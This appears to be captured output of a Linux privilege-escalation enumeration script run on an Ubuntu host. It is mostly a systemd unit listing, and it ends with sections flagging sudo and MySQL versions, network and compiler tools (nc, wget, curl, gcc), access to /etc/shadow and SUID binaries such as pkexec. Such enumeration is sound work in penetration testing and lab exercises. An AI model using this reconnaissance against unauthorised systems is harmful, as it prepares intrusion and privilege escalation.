-rw-r--r-- 1 root root  386 Mar  2  2017 php7.0-fpm.service
-rw-r--r-- 1 root root  153 Feb 27  2017 apt-daily.service
-rw-r--r-- 1 root root  162 Feb 27  2017 apt-daily.timer
drwxr-xr-x 2 root root 4.0K Feb 15  2017 busnames.target.wants
lrwxrwxrwx 1 root root   21 Feb 15  2017 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Feb 15  2017 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 fuse.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root   28 Feb 15  2017 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Feb 15  2017 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Feb 15  2017 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Feb 15  2017 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Feb 15  2017 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Feb 15  2017 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Feb 15  2017 x11-common.service -> /dev/null
lrwxrwxrwx 1 root root   14 Feb 15  2017 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Feb 15  2017 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Feb 15  2017 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Feb 15  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Feb 15  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Feb 15  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Feb 15  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Feb 15  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Feb 15  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Feb 15  2017 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Feb 15  2017 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 reboot.service -> /dev/null
lrwxrwxrwx 1 root root   15 Feb 15  2017 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Feb 15  2017 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Feb 15  2017 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Feb 15  2017 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Feb 15  2017 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Feb 15  2017 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Feb 15  2017 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Feb 15  2017 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb 15  2017 single.service -> /dev/null
-rw-r--r-- 1 root root 1010 Feb 15  2017 debug-shell.service
-rw-r--r-- 1 root root 1009 Feb 15  2017 emergency.service
-rw-r--r-- 1 root root  630 Feb 15  2017 initrd-cleanup.service
-rw-r--r-- 1 root root  790 Feb 15  2017 initrd-parse-etc.service
-rw-r--r-- 1 root root  640 Feb 15  2017 initrd-switch-root.service
-rw-r--r-- 1 root root  664 Feb 15  2017 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  677 Feb 15  2017 kmod-static-nodes.service
-rw-r--r-- 1 root root  473 Feb 15  2017 mail-transport-agent.target
-rw-r--r-- 1 root root  568 Feb 15  2017 quotaon.service
-rw-r--r-- 1 root root  612 Feb 15  2017 rc-local.service
-rw-r--r-- 1 root root  978 Feb 15  2017 rescue.service
-rw-r--r-- 1 root root  724 Feb 15  2017 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Feb 15  2017 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Feb 15  2017 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Feb 15  2017 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  497 Feb 15  2017 systemd-exit.service
-rw-r--r-- 1 root root  674 Feb 15  2017 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Feb 15  2017 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Feb 15  2017 systemd-fsckd.service
-rw-r--r-- 1 root root  544 Feb 15  2017 systemd-halt.service
-rw-r--r-- 1 root root  631 Feb 15  2017 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Feb 15  2017 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Feb 15  2017 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Feb 15  2017 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Feb 15  2017 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  731 Feb 15  2017 systemd-journal-flush.service
-rw-r--r-- 1 root root 1.3K Feb 15  2017 systemd-journald.service
-rw-r--r-- 1 root root  557 Feb 15  2017 systemd-kexec.service
-rw-r--r-- 1 root root  691 Feb 15  2017 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Feb 15  2017 systemd-logind.service
-rw-r--r-- 1 root root  693 Feb 15  2017 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Feb 15  2017 systemd-modules-load.service
-rw-r--r-- 1 root root  685 Feb 15  2017 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 1.3K Feb 15  2017 systemd-networkd.service
-rw-r--r-- 1 root root  553 Feb 15  2017 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Feb 15  2017 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Feb 15  2017 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Feb 15  2017 systemd-reboot.service
-rw-r--r-- 1 root root  907 Feb 15  2017 systemd-resolved.service
-rw-r--r-- 1 root root  696 Feb 15  2017 systemd-rfkill.service
-rw-r--r-- 1 root root  497 Feb 15  2017 systemd-suspend.service
-rw-r--r-- 1 root root  649 Feb 15  2017 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Feb 15  2017 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Feb 15  2017 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Feb 15  2017 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  703 Feb 15  2017 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Feb 15  2017 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  823 Feb 15  2017 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Feb 15  2017 systemd-udev-trigger.service
-rw-r--r-- 1 root root  825 Feb 15  2017 systemd-udevd.service
-rw-r--r-- 1 root root  757 Feb 15  2017 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Feb 15  2017 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Feb 15  2017 systemd-user-sessions.service
-rw-r--r-- 1 root root  528 Feb 15  2017 user@.service
-rw-r--r-- 1 root root  770 Feb 15  2017 console-getty.service
-rw-r--r-- 1 root root  742 Feb 15  2017 console-shell.service
-rw-r--r-- 1 root root  791 Feb 15  2017 container-getty@.service
-rw-r--r-- 1 root root 1.5K Feb 15  2017 getty@.service
-rw-r--r-- 1 root root 1.1K Feb 15  2017 serial-getty@.service
-rw-r--r-- 1 root root  653 Feb 15  2017 systemd-ask-password-console.service
-rw-r--r-- 1 root root  681 Feb 15  2017 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  480 Feb 15  2017 systemd-initctl.service
-rw-r--r-- 1 root root  757 Feb 15  2017 systemd-remount-fs.service
-rw-r--r-- 1 root root  403 Feb 15  2017 -.slice
-rw-r--r-- 1 root root  879 Feb 15  2017 basic.target
-rw-r--r-- 1 root root  379 Feb 15  2017 bluetooth.target
-rw-r--r-- 1 root root  358 Feb 15  2017 busnames.target
-rw-r--r-- 1 root root  394 Feb 15  2017 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Feb 15  2017 cryptsetup.target
-rw-r--r-- 1 root root  670 Feb 15  2017 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Feb 15  2017 dev-mqueue.mount
-rw-r--r-- 1 root root  431 Feb 15  2017 emergency.target
-rw-r--r-- 1 root root  501 Feb 15  2017 exit.target
-rw-r--r-- 1 root root  440 Feb 15  2017 final.target
-rw-r--r-- 1 root root  460 Feb 15  2017 getty.target
-rw-r--r-- 1 root root  558 Feb 15  2017 graphical.target
-rw-r--r-- 1 root root  487 Feb 15  2017 halt.target
-rw-r--r-- 1 root root  447 Feb 15  2017 hibernate.target
-rw-r--r-- 1 root root  468 Feb 15  2017 hybrid-sleep.target
-rw-r--r-- 1 root root  553 Feb 15  2017 initrd-fs.target
-rw-r--r-- 1 root root  526 Feb 15  2017 initrd-root-fs.target
-rw-r--r-- 1 root root  691 Feb 15  2017 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Feb 15  2017 initrd.target
-rw-r--r-- 1 root root  501 Feb 15  2017 kexec.target
-rw-r--r-- 1 root root  395 Feb 15  2017 local-fs-pre.target
-rw-r--r-- 1 root root  507 Feb 15  2017 local-fs.target
-rw-r--r-- 1 root root  405 Feb 15  2017 machine.slice
-rw-r--r-- 1 root root  492 Feb 15  2017 multi-user.target
-rw-r--r-- 1 root root  464 Feb 15  2017 network-online.target
-rw-r--r-- 1 root root  461 Feb 15  2017 network-pre.target
-rw-r--r-- 1 root root  480 Feb 15  2017 network.target
-rw-r--r-- 1 root root  514 Feb 15  2017 nss-lookup.target
-rw-r--r-- 1 root root  473 Feb 15  2017 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Feb 15  2017 paths.target
-rw-r--r-- 1 root root  552 Feb 15  2017 poweroff.target
-rw-r--r-- 1 root root  377 Feb 15  2017 printer.target
-rw-r--r-- 1 root root  693 Feb 15  2017 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Feb 15  2017 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  543 Feb 15  2017 reboot.target
-rw-r--r-- 1 root root  396 Feb 15  2017 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Feb 15  2017 remote-fs.target
-rw-r--r-- 1 root root  486 Feb 15  2017 rescue.target
-rw-r--r-- 1 root root  500 Feb 15  2017 rpcbind.target
-rw-r--r-- 1 root root  402 Feb 15  2017 shutdown.target
-rw-r--r-- 1 root root  362 Feb 15  2017 sigpwr.target
-rw-r--r-- 1 root root  420 Feb 15  2017 sleep.target
-rw-r--r-- 1 root root  409 Feb 15  2017 slices.target
-rw-r--r-- 1 root root  380 Feb 15  2017 smartcard.target
-rw-r--r-- 1 root root  356 Feb 15  2017 sockets.target
-rw-r--r-- 1 root root  380 Feb 15  2017 sound.target
-rw-r--r-- 1 root root  441 Feb 15  2017 suspend.target
-rw-r--r-- 1 root root  353 Feb 15  2017 swap.target
-rw-r--r-- 1 root root  715 Feb 15  2017 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  719 Feb 15  2017 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Feb 15  2017 sys-kernel-debug.mount
-rw-r--r-- 1 root root  518 Feb 15  2017 sysinit.target
-rw-r--r-- 1 root root 1.3K Feb 15  2017 syslog.socket
-rw-r--r-- 1 root root  585 Feb 15  2017 system-update.target
-rw-r--r-- 1 root root  436 Feb 15  2017 system.slice
-rw-r--r-- 1 root root  646 Feb 15  2017 systemd-ask-password-console.path
-rw-r--r-- 1 root root  574 Feb 15  2017 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  409 Feb 15  2017 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  540 Feb 15  2017 systemd-fsckd.socket
-rw-r--r-- 1 root root  524 Feb 15  2017 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Feb 15  2017 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Feb 15  2017 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  842 Feb 15  2017 systemd-journald.socket
-rw-r--r-- 1 root root  591 Feb 15  2017 systemd-networkd.socket
-rw-r--r-- 1 root root  617 Feb 15  2017 systemd-rfkill.socket
-rw-r--r-- 1 root root  450 Feb 15  2017 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  578 Feb 15  2017 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Feb 15  2017 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  395 Feb 15  2017 time-sync.target
-rw-r--r-- 1 root root  405 Feb 15  2017 timers.target
-rw-r--r-- 1 root root  417 Feb 15  2017 umount.target
-rw-r--r-- 1 root root  392 Feb 15  2017 user.slice
-rw-r--r-- 1 root root  411 Feb  3  2017 mysql.service
-rw-r--r-- 1 root root  311 Feb  3  2017 lxcfs.service
-rw-r--r-- 1 root root  342 Feb  2  2017 getty-static.service
-rw-r--r-- 1 root root  153 Feb  2  2017 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  175 Feb  2  2017 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  715 Feb  2  2017 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  189 Dec 16  2016 uuidd.service
-rw-r--r-- 1 root root  126 Dec 16  2016 uuidd.socket
-rw-r--r-- 1 root root  420 Dec  7  2016 resolvconf.service
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  251 Sep 18  2016 open-vm-tools.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
lrwxrwxrwx 1 root root   27 May 10  2016 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 May 10  2016 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 May 10  2016 plymouth-halt.service
-rw-r--r-- 1 root root  426 May 10  2016 plymouth-kexec.service
-rw-r--r-- 1 root root  421 May 10  2016 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 May 10  2016 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 May 10  2016 plymouth-quit.service
-rw-r--r-- 1 root root  244 May 10  2016 plymouth-read-write.service
-rw-r--r-- 1 root root  416 May 10  2016 plymouth-reboot.service
-rw-r--r-- 1 root root  532 May 10  2016 plymouth-start.service
-rw-r--r-- 1 root root  291 May 10  2016 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 May 10  2016 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 May 10  2016 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  986 Apr 26  2016 nginx.service
lrwxrwxrwx 1 root root    9 Apr 16  2016 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  334 Apr 16  2016 dm-event.service
-rw-r--r-- 1 root root  248 Apr 16  2016 dm-event.socket
-rw-r--r-- 1 root root  380 Apr 16  2016 lvm2-lvmetad.service
-rw-r--r-- 1 root root  215 Apr 16  2016 lvm2-lvmetad.socket
-rw-r--r-- 1 root root  335 Apr 16  2016 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  213 Apr 16  2016 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  658 Apr 16  2016 lvm2-monitor.service
-rw-r--r-- 1 root root  382 Apr 16  2016 lvm2-pvscan@.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  234 Apr  9  2016 acpid.service
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  225 Mar 31  2016 apport-forward.socket
-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service
-rw-r--r-- 1 root root  455 Mar 29  2016 iscsid.service
-rw-r--r-- 1 root root 1.1K Mar 29  2016 open-iscsi.service
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.socket
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path
-rw-r--r-- 1 root root  169 Jan 14  2016 atd.service
-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  283 Dec 28  2014 anacron-resume.service
-rw-r--r-- 1 root root  183 Dec 28  2014 anacron.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Feb 15  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Feb 15  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Feb 15  2017 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 24 May 15  2017 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 25 May 15  2017 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 19 May 15  2017 setvtrgb.service -> ../setvtrgb.service
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Feb 15  2017 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 20 Feb 15  2017 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Feb 15  2017 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Feb 15  2017 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Feb 15  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Feb 15  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Feb 15  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Feb 15  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Feb 15  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Feb 15  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 32 Feb 15  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Feb 15  2017 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Feb 15  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Feb 15  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Feb 15  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 30 Feb 15  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 May 10  2016 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Feb 15  2017 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Feb 15  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Feb 15  2017 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 25 Feb 15  2017 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 33 Feb 15  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Feb 15  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 29 May 10  2016 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-quit.service -> ../plymouth-quit.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 May 10  2016 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Feb  2  2017 debian.conf

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 May 10  2016 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb 15  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Feb 15  2017 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Feb 15  2017 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Feb  2  2017 disable-with-time-daemon.conf

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Feb 15  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 May 10  2016 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Feb 15  2017 80-container-host0.network
-rw-r--r-- 1 root root 482 Feb 15  2017 80-container-ve.network
-rw-r--r-- 1 root root  80 Feb 15  2017 99-default.link

/lib/systemd/system-generators:
total 680K
-rwxr-xr-x 1 root root  71K Feb 15  2017 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  59K Feb 15  2017 systemd-dbus1-generator
-rwxr-xr-x 1 root root  43K Feb 15  2017 systemd-debug-generator
-rwxr-xr-x 1 root root  79K Feb 15  2017 systemd-fstab-generator
-rwxr-xr-x 1 root root  39K Feb 15  2017 systemd-getty-generator
-rwxr-xr-x 1 root root 119K Feb 15  2017 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  39K Feb 15  2017 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  39K Feb 15  2017 systemd-insserv-generator
-rwxr-xr-x 1 root root  35K Feb 15  2017 systemd-rc-local-generator
-rwxr-xr-x 1 root root  31K Feb 15  2017 systemd-system-update-generator
-rwxr-xr-x 1 root root 103K Feb 15  2017 systemd-sysv-generator
-rwxr-xr-x 1 root root  11K Apr 16  2016 lvm2-activation-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Feb 15  2017 90-systemd.preset

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.18, for Linux (x86_64) using  EditLine wrapper


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  gcc                                4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler
rc  libxkbcommon0:amd64                0.5.0-1ubuntu2                             amd64        library interface to the XKB compiler - shared library


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1751 May 22  2017 /etc/passwd
-rw-r--r-- 1 root root 886 May 16  2017 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1123 May 22  2017 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40128 May  4  2017 /bin/su
-rwsr-xr-x 1 root root 40152 Dec 16  2016 /bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27608 Dec 16  2016 /bin/umount
-rwsr-xr-x 1 root root 136808 Jan 20  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
